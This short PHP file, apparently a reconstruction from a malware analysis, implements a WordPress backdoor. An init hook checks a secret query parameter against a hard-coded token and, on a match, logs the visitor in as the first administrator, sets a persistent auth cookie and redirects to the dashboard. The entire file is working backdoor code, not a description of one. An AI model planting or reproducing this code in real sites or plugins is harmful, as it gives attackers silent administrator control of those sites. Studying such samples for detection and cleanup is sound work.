<?php
// Reconstruction of the described minimal variant, with a synthetic token.
add_action('init', function () {
    if (!isset($_GET['83e590bb7e9b'])) return;
    if (!hash_equals('0123456789abcdef0123456789abcdef', (string) $_GET['83e590bb7e9b'])) return;
    $admins = get_users(array('role' => 'administrator', 'number' => 1));
    if (!$admins) return;
    $user = $admins[0];
    wp_set_current_user($user->ID, $user->user_login);
    wp_set_auth_cookie($user->ID, true, is_ssl());
    wp_safe_redirect(admin_url('index.php'));
    exit;
});
